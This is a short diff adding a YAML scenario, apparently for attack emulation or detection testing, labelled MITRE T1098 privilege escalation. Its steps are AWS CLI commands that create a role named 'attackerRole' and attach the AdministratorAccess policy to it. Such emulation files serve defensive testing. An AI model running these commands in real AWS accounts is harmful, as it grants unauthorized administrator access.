@@ -1,0 +1,9 @@
+name: Privileged Role Creation via IAM
+description: Privileged Role Creation via IAM
+mitre_technique: T1098
+stage: Privilege Escalation
+steps:
+- action: aws iam create-role --role-name attackerRole
+  description: Create a privileged IAM role
+- action: aws iam attach-role-policy --role-name attackerRole --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+  description: Attach admin policy
